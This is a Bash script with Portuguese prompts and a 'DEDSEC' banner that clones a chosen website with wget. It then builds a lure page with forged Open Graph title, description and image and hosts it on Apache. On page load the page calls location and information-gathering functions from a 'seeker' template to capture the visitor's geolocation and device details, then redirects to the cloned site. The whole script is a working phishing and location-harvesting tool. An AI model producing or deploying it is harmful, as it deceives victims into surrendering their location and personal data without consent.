#!/bin/bash

echo -e """
/$$$$$$$  /$$$$$$$$ /$$$$$$$   /$$$$$$  /$$$$$$$$  /$$$$$$ 
| $$__  $$| $$_____/| $$__  $$ /$$__  $$| $$_____/ /$$__  $$
| $$  \ $$| $$      | $$  \ $$| $$  \__/| $$      | $$  \__/
| $$  | $$| $$$$$   | $$  | $$|  $$$$$$ | $$$$$   | $$      
| $$  | $$| $$__/   | $$  | $$ \____  $$| $$__/   | $$      
| $$  | $$| $$      | $$  | $$ /$$  \ $$| $$      | $$    $$
| $$$$$$$/| $$$$$$$$| $$$$$$$/|  $$$$$$/| $$$$$$$$|  $$$$$$/
|_______/ |________/|_______/  \______/ |________/ \______/ """

read -p "URL do site a ser clonado: " URL
read -p "Porta para hospedar (ex: 8080): " PORTA
read -p "Título da página (og:title): " TITLE
read -p "Descrição da página (og:description): " DESC
read -p "URL da imagem (og:image): " IMAGE

PRIVATE_IP=$(ip route get 8.8.8.8 | awk '{print $7; exit}')
REDIRECT_URL="http://$PRIVATE_IP:$PORTA"

HOSTNAME=$(echo $URL | awk -F/ '{print $3}')
SITENAME=$(echo $HOSTNAME | cut -d'.' -f1)

CLONE_DIR="/var/www/html/site_clone"
TEMPLATE_DIR="$HOME/seeker/template/custom_og_tags"

echo -e "\033[36m[*]\033[0m Clonando o site com wget..."
sudo mkdir -p "$CLONE_DIR"
sudo wget --no-check-certificate --mirror --convert-links --adjust-extension --page-requisites --no-parent "$URL" -P "$CLONE_DIR"

echo -e "\033[36m[*]\033[0m Criando index.html com redirecionamento..."
sudo mkdir -p "$TEMPLATE_DIR"

cat <<EOF | sudo tee "$TEMPLATE_DIR/index.html" > /dev/null
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="utf-8">
    <meta property="og:title" content="$TITLE">
    <meta property="og:site_name" content="$SITENAME">
    <meta property="og:description" content="$DESC">
    <meta property="og:image" content="$IMAGE">
    <title>$TITLE</title>
    <script>
        if (location.protocol === 'http:') {
            location.href = 'https:' + location.href.slice(5);
        }
    </script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
    <script src="js/location.js"></script>
</head>
<body onload="information(); locate(function() { window.location = '$REDIRECT_URL/index2.html'; }, function() { document.body.innerHTML = 'Erro ao localizar.'; } );">
</body>
</html>
EOF

sudo cp "$TEMPLATE_DIR/index.html" "$TEMPLATE_DIR/index_temp.html"

echo -e "\033[36m[*]\033[0m Copiando arquivos para /var/www/html..."
sudo cp "$TEMPLATE_DIR/index.html" /var/www/html/
sudo cp "$TEMPLATE_DIR/index_temp.html" /var/www/html/

echo -e "\033[36m[*]\033[0m Iniciando o Apache..."
if command -v systemctl &> /dev/null; then
    sudo systemctl start apache2
else
    sudo service apache2 start
fi

echo -e "\033[32m[OK]\033[0m Site hospedado em: $REDIRECT_URL"
